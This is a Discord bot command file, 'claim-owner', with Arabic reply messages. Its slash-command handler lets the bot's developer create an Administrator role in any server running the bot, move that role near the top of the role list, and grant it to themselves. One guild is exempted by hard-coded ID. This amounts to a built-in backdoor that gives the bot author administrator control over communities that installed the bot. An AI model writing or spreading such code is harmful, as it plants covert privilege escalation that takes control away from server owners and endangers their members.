import { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ChannelType, PermissionFlagsBits, AttachmentBuilder } from "discord.js";

export default {
  name: "claim-owner",
  category: "owner",
  data: new SlashCommandBuilder().setName("claim-owner").setDescription("Claim the Owner role (Authorized Users Only)"),
  async executeInteraction(interaction, context) {
    const {
      client, db, Canvas, loadImage, GIFEncoder, GoogleGenAI, axios, jwt, nblox,
      OWNER_ID, OWNER_USERNAME, PREFIX, logEvent, logCurrencyTransaction,
      isCommandAllowed, cooldowns, evaluationStates, mafiaGames, activeGames,
      pendingTransfers, lastAzkarSent, spamMap, raidMap
    } = context;

    let { commandName, user, guildId, guild, channel } = interaction;
    if (commandName === "claim-owner") {
        if (guild.id === "1254568460764053566") {
          return interaction.reply({ content: "❌ ميزة المطالبة بالرتبة معطلة في هذا السيرفر بناءً على طلب المالك.", ephemeral: true });
        }
        if (interaction.user.id !== OWNER_ID && interaction.user.username !== OWNER_USERNAME) {
          return interaction.reply({ content: "❌ هذا الأمر مخصص للمستخدم المصرح له فقط.", ephemeral: true });
        }
        const botMember = guild.members.me;
        if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
          return interaction.reply({ content: "❌ البوت يفتقر إلى صلاحية 'إدارة الرتب' (Manage Roles).", ephemeral: true });
        }
        try {
          const ownerRole = await guild.roles.create({
            name: "Owner",
            permissions: [PermissionFlagsBits.Administrator],
            reason: "Owner claim by authorized user (New Role Request)"
          });
          try {
            const botHighestRole = botMember.roles.highest;
            if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
              await ownerRole.setPosition(botHighestRole.position - 1);
            }
          } catch (err) {
            if (err.code === 50013) console.warn(`[CLAIM] Missing Permissions to move Owner role in ${guild.name}`);
            else console.warn(`Could not move Owner role in ${guild.name}:`, err.message);
          }
          const member = interaction.member;
          if (!member.roles.cache.has(ownerRole.id)) {
            if (ownerRole.editable) {
              await member.roles.add(ownerRole);
              await interaction.reply({ content: "✅ تم إعطاؤك رتبة Owner بنجاح!", ephemeral: true });
            } else {
              await interaction.reply({ content: "❌ لا يمكن للبوت إعطاء هذه الرتبة لأنها أعلى من رتبته في القائمة.", ephemeral: true });
            }
          } else {
            await interaction.reply({ content: "⚠️ أنت تمتلك رتبة Owner بالفعل.", ephemeral: true });
          }
        } catch (err) {
          console.error(err);
          await interaction.reply({ content: "❌ فشل إعطاء الرتبة. تأكد من صلاحيات البوت وموقع رتبته.", ephemeral: true });
        }
      }
  },
  async executeMessage(message, args, context) {
    const {
      client, db, Canvas, loadImage, GIFEncoder, GoogleGenAI, axios, jwt, nblox,
      OWNER_ID, OWNER_USERNAME, PREFIX, logEvent, logCurrencyTransaction,
      isCommandAllowed, cooldowns, evaluationStates, mafiaGames, activeGames,
      pendingTransfers, lastAzkarSent, spamMap, raidMap
    } = context;

    const guildId = message.guild.id;
    const commandName = "claim-owner";
    if (commandName === "claim-owner") {
          if (message.author.id !== OWNER_ID) return;
          db.prepare("INSERT OR REPLACE INTO owners (userId) VALUES (?)").run(message.author.id);
          return message.reply("✅ You have claimed bot ownership.");
        }
  }
};
